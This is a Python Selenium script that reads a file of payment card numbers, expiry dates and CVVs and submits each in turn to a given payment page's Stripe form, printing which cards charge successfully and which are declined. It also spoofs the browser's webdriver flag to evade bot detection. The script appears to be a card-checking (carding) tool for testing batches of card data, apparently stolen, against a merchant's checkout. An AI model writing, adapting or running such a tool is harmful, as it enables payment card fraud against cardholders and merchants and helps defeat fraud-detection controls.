from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time

def init_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")  # remove or comment this line to see browser window
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    driver = webdriver.Chrome(options=options)
    # Prevent webdriver detection
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    return driver

def fill_stripe_iframe_field(driver, iframe_name_start, value):
    """Find iframe beginning with iframe_name_start and fill its input field with value."""
    iframes = driver.find_elements(By.TAG_NAME, "iframe")
    for iframe in iframes:
        name = iframe.get_attribute("name") or ""
        if name.startswith(iframe_name_start):
            driver.switch_to.frame(iframe)
            input_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "input"))
            )
            input_field.clear()
            input_field.send_keys(value)
            driver.switch_to.default_content()
            return True
    return False

def fill_payment_form(driver, card_line, cardholder_name="faheem", country="India"):
    card_number, mm, yyyy, cvv = card_line.strip().split('|')
    year_short = yyyy[-2:]
    expiry = f"{mm}{year_short}"  # Stripe usually needs MMYY without slash
    
    # Must adjust these prefixes based on inspecting the payment page Stripe iframe names
    # These values are typical, but might vary between sites/Stripe versions
    card_iframe_prefix = "__privateStripeFrame5"    # Card number iframe prefix
    exp_iframe_prefix = "__privateStripeFrame6"     # Expiry date iframe prefix
    cvc_iframe_prefix = "__privateStripeFrame7"     # CVC iframe prefix
    
    # Fill card number
    if not fill_stripe_iframe_field(driver, card_iframe_prefix, card_number):
        raise Exception("Card number input iframe not found")
    
    # Fill expiry date (MMYY)
    if not fill_stripe_iframe_field(driver, exp_iframe_prefix, expiry):
        raise Exception("Expiry date input iframe not found")
    
    # Fill CVC
    if not fill_stripe_iframe_field(driver, cvc_iframe_prefix, cvv):
        raise Exception("CVC input iframe not found")
    
    # Fill cardholder name input outside iframes (common selectors)
    try:
        name_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((
                By.XPATH, "//input[contains(@placeholder, 'Full name') or contains(translate(@id,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'), 'name')]"
            ))
        )
        name_input.clear()
        name_input.send_keys(cardholder_name)
    except TimeoutException:
        # No cardholder name field found - skip
        pass

    # Select country from dropdown if present
    try:
        country_select = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "select"))
        )
        Select(country_select).select_by_visible_text(country)
    except TimeoutException:
        pass
    
    # Click pay button (button text contains "Pay")
    pay_button = WebDriverWait(driver, 15).until(
        EC.element_to_be_clickable((By.XPATH, "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'pay')]"))
    )
    pay_button.click()

def wait_for_payment_result(driver, timeout=25):
    wait = WebDriverWait(driver, timeout)
    try:
        success_elem = wait.until(EC.presence_of_element_located((
            By.XPATH,
            "//*[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'thank you') or contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'success')]"
        )))
        return True, success_elem.text
    except TimeoutException:
        try:
            error_elem = driver.find_element(By.XPATH,
                "//*[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'declined') or contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'error') or contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'failed')]"
            )
            return False, error_elem.text
        except NoSuchElementException:
            return False, "No clear payment success or decline message found."

def main():
    driver = init_driver()
    url = input("Enter the payment page URL: ").strip()
    file_path = input("Enter path to card data file (.txt): ").strip()
    
    with open(file_path, "r") as f:
        card_lines = [line.strip() for line in f if line.strip()]
    
    for card_line in card_lines:
        print(f"Processing card: {card_line}")
        try:
            driver.get(url)
            time.sleep(5)  # Wait page and iframes load
            
            fill_payment_form(driver, card_line)
            success, msg = wait_for_payment_result(driver)
            
            if success:
                print(f"{card_line} (SUCCESS CHARGE)")
            else:
                print(f"{card_line} (DECLINED or ERROR) - {msg}")
            
            time.sleep(5)  # Wait a bit before next card
        except Exception as e:
            print(f"{card_line} (ERROR) - Exception: {e}")
    
    driver.quit()

if __name__ == "__main__":
    main()
